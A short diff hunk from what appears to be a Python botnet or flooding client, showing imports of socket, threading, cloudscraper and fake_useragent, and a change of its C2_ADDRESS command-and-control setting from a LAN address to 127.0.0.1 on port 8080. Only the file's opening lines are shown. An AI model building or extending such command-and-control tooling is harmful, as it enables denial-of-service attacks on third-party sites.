@@ -1,7 +1,7 @@
 import socket,threading,time,requests,random,cloudscraper,string
 from fake_useragent import FakeUserAgent,UserAgent
 
-C2_ADDRESS  = "192.168.1.101"
+C2_ADDRESS  = "127.0.0.1"
 C2_PORT     = 8080
 
 def user_gen():
